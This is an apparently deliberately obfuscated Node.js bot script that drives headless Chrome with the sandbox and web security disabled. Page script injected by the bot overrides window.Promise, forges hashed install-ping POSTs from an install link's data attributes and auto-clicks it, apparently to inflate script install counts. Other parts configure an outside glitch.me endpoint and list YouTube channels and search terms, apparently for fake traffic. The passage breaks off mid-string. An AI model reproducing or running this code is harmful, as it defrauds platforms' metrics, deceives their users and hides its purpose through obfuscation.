              for (J = 0x1 * 0xfbc + -0x1 * -0x4cb + 0x1487 * -0x1; J < -0x3 * 0x7a1 + 0xd2d + 0x7 * 0x166; J += 0x10a6 * -0x1 + -0x5b * -0x49 + -0x948)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x15a2 + -0x1d31 + 0x794 | L >>> -0x1 * -0x5db + -0x35e + -0x262) + (M & N | ~M & O) + P + (0x6eb0be5 + -0x14857 * -0x1fe7 + 0x2aac9e33) + Q[J] << 0x2a * -0x1 + 0x977 * 0x3 + -0x969 * 0x3) << 0x187 * 0x5 + 0xfd1 + -0x176f | P >>> -0x13 * 0x25 + -0x15c7 + 0x18a1) + (L & (M = M << 0x5 * -0x36f + -0x1085 * 0x2 + -0x1 * -0x3253 | M >>> 0xbee * 0x2 + -0xfa1 + -0x5 * 0x1a5) | ~L & N) + O + (-0x662caa * -0x73 + -0x25ff7ea + 0x2efc6125) + Q[J + (0x1d98 + -0xa7 * 0xa + -0x1711)] << -0x17af + 0x95c * -0x1 + 0x1 * 0x210b) << -0x10b * 0x12 + -0x4dc + 0x5 * 0x4bb | O >>> -0x16 * -0x139 + 0x1e07 + -0x38d2) + (P & (L = L << -0x1aad * -0x1 + 0x1 * -0x2673 + 0xbe4 | L >>> 0x10fe + 0xd28 + -0x1e24) | ~P & M) + N + (-0x1c640ab * -0x4b + 0x940500eb + -0xbe97796b) + Q[J + (-0x1ee4 + 0x24b * 0x5 + -0x3e3 * -0x5)] << -0x692 + 0x71d + -0x8b * 0x1) << -0x5 * 0x61a + 0x503 + 0x1984 | N >>> -0x1 * -0x1811 + -0x1829 + 0x1 * 0x33) + (O & (P = P << -0xab7 * -0x1 + 0x11 * 0x105 + -0x1bee | P >>> -0x1 * -0x234d + 0x2013 + -0x435e) | ~O & L) + M + (-0x17dfb1d * 0x1f + -0xa9816af5 + 0x132454d11) + Q[J + (0xcd4 + -0x41b + 0x5 * -0x1be)] << -0x32 * -0x20 + 0x78e + -0xdce) << 0x11fc + 0x71e + -0x1915 | M >>> 0x1 * 0x25eb + -0x1430 + 0x11a0 * -0x1) + (N & (O = O << -0xe60 + -0x58 * -0x53 + -0xe0a | O >>> -0x1bf0 + 0x56f * -0x1 + 0x2161) | ~N & P) + L + (-0x758fc74b + 0x1 * -0x7f490c99 + 0x49 * 0x4980b95) + Q[J + (-0x11 * 0x1d0 + 0x15c + 0x1d78)] << -0x75a * 0x2 + 0x36d + -0xb47 * -0x1, N = N << 0x804 + 0x2092 + -0x2878 | N >>> -0xbfb + 0x269a + -0x1a9d;
              for (; J < 0x47d * -0x3 + -0xc4b + 0x19ea; J += -0x3b4 + -0x1 * 0xa93 + 0x4 * 0x393)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1d3 * 0xa + 0x1936 + -0x2b6f * 0x1 | L >>> -0x748 * 0x4 + -0x2 * -0xa18 + 0x1 * 0x90b) + (M ^ N ^ O) + P + (-0x4401ba43 + 0x17bf6 * -0x8b21 + 0x1815b329a) + Q[J] << 0x3d7 + 0x1 * -0xcf1 + 0x1 * 0x91a) << -0xe6d + -0x1709 + 0x5 * 0x77f | P >>> 0x21c + -0xcd4 + 0xad3) + (L ^ (M = M << -0x20c1 + -0x84 + 0x7 * 0x4c5 | M >>> 0x19e3 * 0x1 + 0x16 * 0x116 + 0x1f * -0x19b) ^ N) + O + (-0xac84e588 + -0x42 * 0xede7df + 0x158b498a7) + Q[J + (0x199 * 0x2 + -0x1721 + 0x13f0)] << -0x94e + -0x1643 + -0x1f91 * -0x1) << -0x1f89 + -0x3e + 0x1fcc * 0x1 | O >>> -0x16bd * 0x1 + 0x8bd + 0xe1b) + (P ^ (L = L << 0x7 * -0x1a7 + -0x2574 + -0x257 * -0x15 | L >>> 0x21 * -0x10 + 0x180 + 0x92) ^ M) + N + (0x2f1bf * 0xef9 + 0xfa98d50 + -0xddbdfe * -0x3b) + Q[J + (-0x1 * 0x469 + 0x20c3 + 0x8 * -0x38b)] << -0x1f * 0x109 + -0x1768 + 0x377f * 0x1) << 0xbd3 + -0x2535 + 0x7 * 0x3a1 | N >>> -0x21 * -0x3e + 0xebe + 0x78b * -0x3) + (O ^ (P = P << -0x1529 + -0x1f17 + 0x345e | P >>> -0x1 * -0x97 + 0x1c85 + -0x1d1a) ^ L) + M + (-0x7e3442 * -0xe2 + -0x1 * -0x8985e32d + -0x8a1619d0) + Q[J + (0x134 * 0xb + -0x1309 + -0x3e * -0x18)] << 0x10df + -0x4d * 0x10 + 0x15 * -0x93) << 0x322 + -0x6c7 + 0x3aa | M >>> 0x16bb * -0x1 + 0xded * -0x1 + 0x24c3) + (N ^ (O = O << -0x317 + -0x769 * 0x3 + -0x2 * -0xcb8 | O >>> 0x14b8 + -0x17cc + 0x316) ^ P) + L + (0x28487c15 * -0x1 + -0xb7193626 + -0xa * -0x216c5c96) + Q[J + (0x1062 * 0x1 + -0x7f5 * -0x3 + -0x283d * 0x1)] << 0x1809 + 0x241 * 0x10 + -0x3c19, N = N << -0x279 + -0x9d7 + 0xc6e | N >>> -0x12e * -0xd + -0x1 * 0x2509 + 0x15b5;
              for (; J < 0x15d2 + -0x719 * -0x2 + -0x23c8; J += -0x1f63 + 0x17 * 0x59 + 0x1cd * 0xd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x11 * 0x1df + -0x4f * 0x20 + 0x29b4 | L >>> -0x1 * 0x2456 + 0x4 * -0x3ff + 0x346d) + (M & N | M & O | N & O) + P - (-0x1673ef1 * -0x6a + 0x165dce06 * -0x7 + -0x6090aad * -0x14) + Q[J] << -0x32 * -0x8 + -0x1996 + 0x1806) << 0x1285 * -0x1 + 0x1cf5 + -0xa6b | P >>> -0x1ebe * 0x1 + 0x19b * 0x9 + 0x1 * 0x1066) + (L & (M = M << -0xe4 + -0x7b * -0x33 + -0x177f | M >>> 0x3 * 0x59f + -0x19d0 + -0x8f5 * -0x1) | L & N | M & N) + O - (0x101 * -0x7387a5 + -0x2939f * -0x15c3 + 0xacccf2ac) + Q[J + (-0x1158 + -0x1d11 + -0xd * -0x392)] << -0x23a8 + -0x9d9 * 0x2 + 0x375a) << 0x890 * -0x2 + -0x1 * 0x1df9 + -0xa3 * -0x4a | O >>> -0x2 * 0xac1 + 0x163 * -0xe + 0x2907) + (P & (L = L << -0x19f0 + 0x851 + 0x1 * 0x11bd | L >>> -0x924 + 0x1 * -0x532 + 0xe58) | P & M | L & M) + N - (0x1 * -0x4e0b59e7 + 0x1f49478f + 0x9fa6557c) + Q[J + (-0x1543 + -0x116 * 0x1c + -0x33ad * -0x1)] << -0x1 * -0x1ffd + -0x1 * 0xa76 + -0x1587) << 0x1e81 * -0x1 + -0x18 * -0xc2 + -0x62b * -0x2 | N >>> -0xc9 * 0x2a + -0x962 * 0x4 + 0x469d * 0x1) + (O & (P = P << -0x25cc + -0x18e5 * -0x1 + 0xd05 | P >>> -0x1 * -0x2259 + -0x27 * -0xbb + 0xfb5 * -0x4) | O & L | P & L) + M - (0x2fa12d * 0x246 + -0x139112a2 * -0x1 + -0xef53bcc) + Q[J + (0xf76 * 0x1 + -0x30 + -0xf43)] << 0x13a4 + -0x19eb * -0x1 + 0x6d * -0x6b) << -0x20ff + -0x2353 * -0x1 + -0x24f | M >>> 0x26ec + -0x187d + 0x1c * -0x83) + (N & (O = O << -0x12ee + -0x2dc * -0x2 + 0xd54 | O >>> 0x13b1 + 0x86f + -0x1c1e) | N & P | O & P) + L - (0x51d11e7c + -0xa8aefb * 0x127 + 0x1 * 0xe174c7e5) + Q[J + (-0x1812 * 0x1 + -0x4fd * -0x4 + 0x422)] << 0x1 * 0x8a + -0x254d + 0x24c3, N = N << 0x577 * -0x3 + -0x753 + 0x17d6 | N >>> -0x1df1 + 0xa7 * 0x2b + 0x36 * 0x9;
              for (; J < 0x152f * -0x1 + -0x1ad9 + 0x3058; J += 0x1c2d + 0xb * -0x1f7 + -0x1 * 0x68b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x24db * -0x1 + 0x1333 + -0x3809 | L >>> 0x1 * -0x1992 + -0x1146 + 0x5 * 0x897) + (M ^ N ^ O) + P - (-0x1 * 0x66334173 + 0x287c9c57 * -0x1 + 0xc44d1bf4) + Q[J] << -0x2229 + 0x20ea + 0xb * 0x1d) << -0x23bc + 0x5ab * 0x1 + 0x2 * 0xf0b | P >>> 0x13bd + -0x3c + -0x1366) + (L ^ (M = M << 0x2357 + 0x1e0d + -0x4146 | M >>> -0x1c31 + -0x1 * -0x1fdd + -0x3aa) ^ N) + O - (-0x2dae8d49 + -0x3 * 0x13ebc893 + -0x135105 * -0x83c) + Q[J + (-0x1d79 * 0x1 + -0x690 + 0x240a)] << 0x1181 + -0x5f * -0x13 + -0x188e * 0x1) << -0xee0 + -0x1807 + 0x5e * 0x6a | O >>> 0x1929 + 0xcef + -0x25fd) + (P ^ (L = L << -0x36 * 0x5 + -0xd * 0xb3 + 0x25 * 0x47 | L >>> -0x3 * -0xb14 + 0x189d * 0x1 + -0x473 * 0xd) ^ M) + N - (0x1578ca2c + 0x8 * 0x43dc104 + -0x1c99422) + Q[J + (-0x6ee * -0x2 + -0x1f5b + 0x1181)] << -0xd * 0xe + 0x16d5 + -0x161f) << -0x1b85 + -0x227e * 0x1 + 0x3e08 | N >>> 0x28d * 0xb + -0x11bd * -0x1 + -0x2db1) + (O ^ (P = P << 0x2 * -0x1011 + -0x2 * -0xdf0 + 0xe * 0x50 | P >>> -0x1 * 0xae8 + -0x3be + 0x43 * 0x38) ^ L) + M - (0x5cd8868c + -0x66438c15 + 0x3f0843b3) + Q[J + (-0x1412 + 0x1383 + 0x2 * 0x49)] << -0x1df9 + -0x163d * 0x1 + 0x3436) << 0x21df + 0x6a0 + -0x6 * 0x6bf | M >>> -0x1075 * 0x2 + 0x19ed * 0x1 + -0x4 * -0x1c6) + (N ^ (O = O << -0x1ccb + -0x3e * 0x86 + 0x3d5d | O >>> -0x1 * 0x295 + 0x2363 + -0x833 * 0x4) ^ P) + L - (-0x59 * -0x2200e5 + 0x3391a96e + -0x9c6bae1) + Q[J + (0x1 * 0x11b6 + -0x26b0 + -0x1 * -0x14fe)] << 0x2491 + -0x20b * 0x11 + -0x1d6, N = N << 0xe * 0x1df + -0x1 * -0x222f + -0x3c43 | N >>> -0x1c4a + -0x2048 + -0x1e4a * -0x2;
              this['h0'] = this['h0'] + L << -0x54c + 0x235 * -0x4 + 0xe20, this['h1'] = this['h1'] + M << 0x2 * -0x1a1 + 0x4 * -0x32a + 0xfea, this['h2'] = this['h2'] + N << -0x217a + 0x167f * -0x1 + 0x37f9, this['h3'] = this['h3'] + O << 0x2 * 0x989 + 0x14ed + -0x27ff, this['h4'] = this['h4'] + P << 0x97 * -0x14 + 0xe3 * 0x2a + -0x1972;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xcc6 + -0x1 * -0x19a9 + -0xcc7 & -0x323 * 0x1 + 0xb94 * 0x3 + -0x1f8a] + w[J >> -0x14 * -0x51 + -0x1f57 + -0x1 * -0x191b & 0x46d + 0x5c * 0x47 + -0x1de2] + w[J >> -0x1 * -0xc2e + 0x1368 + -0x1f82 & 0x42 + 0x5c5 + -0x5f8] + w[J >> -0x110e + -0x1 * -0x219 + 0xf05 & 0x1 * -0x1877 + 0x1c1a + 0x2 * -0x1ca] + w[J >> -0x1c17 + 0x462 * -0x4 + 0x1b * 0x1b1 & 0xe57 + -0x1ed7 * 0x1 + 0x108f * 0x1] + w[J >> -0x1814 + 0x18b8 + -0x9c & -0x2 * 0x3a9 + -0x5 * -0x341 + -0x472 * 0x2] + w[J >> -0xe3e + 0x355 * -0x2 + 0x14ec & 0x9 * 0x21f + 0xa5d * -0x1 + -0x8ab] + w[0x22b6 + -0x2431 + 0x1 * 0x18a & J] + w[K >> 0xebe + -0xaf * -0x2b + 0xd * -0x363 & 0x1 * 0x2709 + 0x1ca7 + -0xc7 * 0x57] + w[K >> 0x182d + -0x19cf + 0x1ba & 0x2543 + 0xad6 * 0x2 + 0x1d7 * -0x20] + w[K >> -0x125 * 0x9 + 0x93a + 0x127 & -0xb3a * 0x1 + 0x14e * -0x1c + 0x2fd1] + w[K >> -0x72d * -0x4 + -0xb * 0x8 + 0x2 * -0xe26 & 0xcc0 + 0x2267 + -0x2f18] + w[K >> 0x6b * 0x3b + -0x2b * -0xac + -0x3581 & -0x140e * 0x1 + -0x1b53 + 0x3f4 * 0xc] + w[K >> 0x20a3 + -0x19 * 0x159 + 0x8b * 0x2 & 0x11fd + 0x1e55 * 0x1 + 0x7 * -0x6e5] + w[K >> 0x6 * -0x3b7 + -0x223d + 0x388b & -0x106a + 0x3 * -0x6ab + 0x247a] + w[0x1d12 + -0x22be + 0x5bb & K] + w[L >> 0x1b * -0x12e + -0xdba + 0x2db0 & -0x5 * 0x2b0 + 0x14b0 + -0x731] + w[L >> 0x199 * -0x7 + 0x138d + -0x2c2 * 0x3 & -0x2e5 + -0x26a4 + -0x8 * -0x533] + w[L >> -0xd55 + 0x1aa6 + -0xd3d & -0x1b97 + -0x22fb + 0x3ea1] + w[L >> -0x24dc + 0x1 * 0x1647 + -0xa3 * -0x17 & 0x1fbb + -0x1b2 + -0x4ff * 0x6] + w[L >> 0x1456 * -0x1 + -0x19f6 + -0xb96 * -0x4 & 0x1958 * 0x1 + -0x2 * 0x1e5 + 0x1 * -0x157f] + w[L >> 0x16a3 + -0x1 * -0x1ef6 + 0x28d * -0x15 & -0x35 + -0x2541 + -0x781 * -0x5] + w[L >> -0x31c * 0x3 + 0x10c0 + 0xed * -0x8 & -0x1121 + -0x2141 + -0x3271 * -0x1] + w[0x1f81 + 0x1e29 + 0x7 * -0x8cd & L] + w[M >> -0x205d + 0x997 + -0x16e2 * -0x1 & 0x230a + 0x195b + -0x3c56] + w[M >> -0x1f92 + 0xa5e * -0x1 + 0x2a08 & -0x50a + 0x1ff8 + -0x1 * 0x1adf] + w[M >> 0x26d1 + 0x1 * 0x12d3 + -0x3990 & 0x63c + -0x1e * 0x83 + 0x92d] + w[M >> -0xfa0 + -0x22 * -0x8b + 0x163 * -0x2 & -0x4 * 0xc7 + 0x1cf0 + -0x19c5] + w[M >> -0x4d8 + 0x1a66 + 0x2 * -0xac1 & 0x207f + -0x1502 + -0x16 * 0x85] + w[M >> -0x373 * -0x1 + -0x19c * 0x1 + -0x1cf & -0x3 * -0x60d + 0x1 * -0x2131 + -0x305 * -0x5] + w[M >> -0xc40 + -0x8a5 * -0x3 + -0x1 * 0xdab & -0xc9e + 0x250f + -0x1862] + w[0x1 * -0x1c09 + -0x1ccd + 0xb61 * 0x5 & M] + w[N >> 0x1 * 0x1aea + 0x28 * -0x4a + -0xf3e & -0xe0 * -0x27 + 0x1dfa + -0x1 * 0x400b] + w[N >> 0x1 * -0x6c9 + 0x11bc + -0x7 * 0x18d & -0x1eb6 + 0x88 * 0x2b + 0x7ed] + w[N >> -0xba7 + -0xce5 + 0x10 * 0x18a & 0x9 * -0x33b + 0x1a83 + 0x1 * 0x29f] + w[N >> 0x2 * 0x1c4 + -0x5 * 0x4f + -0x1ed * 0x1 & 0x20f1 + -0x1f04 + -0x1de] + w[N >> 0x164 * -0x8 + 0xb6 * -0x2e + 0x36 * 0xd0 & 0x1e3b + -0x5b9 + -0x1873] + w[N >> -0x36d + -0x2 * 0x751 + 0x1217 & -0x2 * 0xc4d + -0x18c2 + 0x316b] + w[N >> 0x7e * -0x2f + -0x1031 + -0x1b * -0x175 & -0x127c + -0x2 * 0x2c5 + 0x1815] + w[-0x373 * -0x2 + 0x1e27 + -0x24fe & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x5cf + -0x1 * 0x1085 + 0xace & 0x5ed * -0x1 + 0x232b + -0x1c3f,
                J >> 0xb76 + -0x12c7 + 0x761 & 0x1 * 0x109d + 0xd3 * -0x2f + 0x171f * 0x1,
                J >> 0x1b * 0xe5 + -0x2552 + -0x6d * -0x1f & -0x7 * 0x569 + 0x1057 + 0x1687,
                -0x5f7 + -0x13ef + 0x1ae5 & J,
                K >> -0x1ea1 + -0x2 * -0x16f + 0x1bdb & 0x190b + 0x820 + -0x202c,
                K >> -0x419 * -0x9 + -0x52d + -0x1fa4 & 0x688 + 0x936 + 0x2f3 * -0x5,
                K >> 0x842 * -0x1 + 0x70e + 0x13c & -0xda4 + 0x139 * 0x1a + -0x1 * 0x1127,
                0x16 * 0x113 + -0xc21 + 0x5 * -0x21a & K,
                L >> 0x3b0 + 0x20dd * -0x1 + -0x7f * -0x3b & 0x514 * 0x1 + -0x20 * -0x6b + -0x1175,
                L >> -0x3 * -0xc6d + 0x1f2 + -0x2729 & 0x25cb + -0xcd0 + -0x17fc,
                L >> -0x8e0 + 0x1 * 0x1d36 + 0x1 * -0x144e & -0xc6d * 0x1 + 0x482 * 0x2 + 0x3 * 0x178,
                0x1 * -0x8ed + 0x1 * 0x2003 + -0x1617 & L,
                M >> -0xbfc * 0x2 + -0x1078 + 0x2888 & -0x708 + -0x2a3 * 0xe + 0x41 * 0xb1,
                M >> -0x29 * 0x37 + -0x1984 + 0x2263 & 0x2057 + -0x1349 + -0xc0f,
                M >> -0x6 * 0x371 + 0x18e3 + -0x3 * 0x167 & -0x1fd4 + -0x1cda + 0x3dad,
                -0xef2 + 0x1d73 + 0x5b * -0x26 & M,
                N >> -0x679 * -0x1 + 0x1 * 0xd3 + -0x734 & 0x1 * 0x132d + -0x7c7 * -0x5 + -0x3911,
                N >> 0x3 * -0xc0e + -0x208b + 0x44c5 & 0x1b12 + 0x243f + -0x3e52,
                N >> -0x5 * 0x14f + 0x1 * -0x19f3 + 0x2086 & 0x1cc1 + 0x1744 + -0x3306,
                0xb5 * 0x1 + 0x5a0 + -0x556 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1 * 0x1fc3 + -0x159 + -0xb * 0x2c2), (K = new DataView(J))['setUint32'](-0x1d95 + -0x77 * 0x3 + 0x1efa, this['h0']), K['setUint32'](-0x1539 + 0x379 + 0x11c4, this['h1']), K['setUint32'](-0x1449 * 0x1 + 0x17e1 + -0x3 * 0x130, this['h2']), K['setUint32'](-0x64c + 0xd * -0x8e + 0xd8e, this['h3']), K['setUint32'](-0x6 * 0x139 + 0x167f + -0xf19, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x2 * 0x3ee + -0xa * 0x389 + 0x2b36];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1d60 + 0x22 + -0x1d82;
            J[-0x2531 + -0x1779 + 0x2 * 0x1e55]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x21eb + -0x1a0f + -0x7dc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1b0c + -0x17 * -0x71 + 0x10e6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x7 * -0xfb + 0x13bd * -0x1 + 0xce1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x49 * -0x29 + 0x15b3 + -0x426), Promise['resolve'](0x25f1 + -0x5f5 + -0x1 * 0x1ffb);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x21b3 + -0x19cc + -0x121 * 0x7; j < -0x260 + 0xaff * 0x3 + -0x4 * 0x7a7; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1142 + 0x1e67 + -0x2fa9);
    let h = e[f];
    if (c['ncGKTZ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xe48 + 0x1e28 + -0xfe0, r, s, t = -0x2213 + 0xfdf + 0x5 * 0x3a4; s = m['charAt'](t++); ~s && (r = q % (-0x924 + 0x1b56 + -0xb3 * 0x1a) ? r * (-0x2219 + -0x1a * 0x144 + -0x1 * -0x4341) + s : s, q++ % (-0x123 * -0x21 + 0x1 * -0x3c5 + -0x21ba)) ? o += String['fromCharCode'](-0x1f * 0x95 + 0x1f3 + -0x19 * -0xaf & r >> (-(0x20df + 0x4 * 0x103 + 0x35b * -0xb) * q & -0xdaa + 0x233 + 0xad * 0x11)) : 0x11 * -0xa3 + 0x149 + 0x98a) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1cb4 + -0x3d5 + -0x2089 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x2 * 0xc2d + -0xd * 0x266 + 0x3798))['slice'](-(0x137c + 0x1aa1 * -0x1 + 0x727));
        }
        return decodeURIComponent(p);
      };
      c['QrkZwU'] = i, b = arguments, c['ncGKTZ'] = !![];
    }
    const j = e[0x25cb + -0x1 * 0x7f + -0x7c * 0x4d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['QrkZwU'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const NETWORK_PATIENCE = -0x1 * 0x10db + -0x4 * 0xe70 + 0x69db + (0x1c61 * -0x1 + 0x1cb7 * -0x1 + 0x44d0) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x24c9 * 0x1 + 0x1 * 0xa7b + -0x2f41) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1142 + 0x1e67 + -0x2fa9);
    let h = e[f];
    return h;
  }, d(b, c);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1142 + 0x1e67 + -0x2fa9);
    let h = e[f];
    if (b['xTYowo'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xe48 + 0x1e28 + -0xfe0, s, t, u = -0x2213 + 0xfdf + 0x5 * 0x3a4; t = n['charAt'](u++); ~t && (s = r % (-0x924 + 0x1b56 + -0xb3 * 0x1a) ? s * (-0x2219 + -0x1a * 0x144 + -0x1 * -0x4341) + t : t, r++ % (-0x123 * -0x21 + 0x1 * -0x3c5 + -0x21ba)) ? p += String['fromCharCode'](-0x1f * 0x95 + 0x1f3 + -0x19 * -0xaf & s >> (-(0x20df + 0x4 * 0x103 + 0x35b * -0xb) * r & -0xdaa + 0x233 + 0xad * 0x11)) : 0x11 * -0xa3 + 0x149 + 0x98a) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1cb4 + -0x3d5 + -0x2089 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2 * 0xc2d + -0xd * 0x266 + 0x3798))['slice'](-(0x137c + 0x1aa1 * -0x1 + 0x727));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x25cb + -0x1 * 0x7f + -0x7c * 0x4d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2346 + -0x2139 + 0x15 * -0x19; u < 0x22db + -0x26dc + 0x501; u++) {
          p[u] = u;
        }
        for (u = 0x14fd + -0x22e9 + 0x84 * 0x1b; u < -0x2251 * -0x1 + -0x12c9 + 0x4d8 * -0x3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * 0x2513 + -0xa49 + -0x19ca * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x10ef + -0x483 + -0xc6c, q = -0x17da + -0x5 * -0x253 + 0xc3b;
        for (let v = -0x1 * -0x110a + -0x7db + -0x92f; v < n['length']; v++) {
          u = (u + (0x1 * 0x228e + 0x36e + -0x25fb)) % (-0x149 * 0x11 + 0x5f9 + 0x10e0), q = (q + p[u]) % (-0x1 * 0xbb3 + 0x1859 + -0xba6), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x785 + -0x2166 + 0x29eb)]);
        }
        return t;
      };
      b['dzfIvj'] = m, c = arguments, b['xTYowo'] = !![];
    }
    const j = e[0xc14 * 0x1 + -0xe * 0x174 + 0x844],
      k = f + j,
      l = c[k];
    return !l ? (b['oOtOnn'] === undefined && (b['oOtOnn'] = !![]), h = b['dzfIvj'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x90e + 0xb9f + -0x14ad; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 